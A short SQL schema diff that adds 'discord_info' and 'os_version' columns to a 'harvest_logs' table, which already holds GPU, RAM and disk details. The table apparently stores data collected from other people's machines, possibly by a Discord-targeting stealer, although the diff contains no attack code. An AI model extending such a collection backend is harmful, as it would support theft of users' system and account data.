@@ -24,6 +24,8 @@ CREATE TABLE IF NOT EXISTS harvest_logs (
     gpu_info TEXT,
     ram_info TEXT,
     disk_info TEXT,
+    discord_info VARCHAR(255) DEFAULT 'N/A',
+    os_version VARCHAR(255) DEFAULT 'N/A',
     timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
 );
 
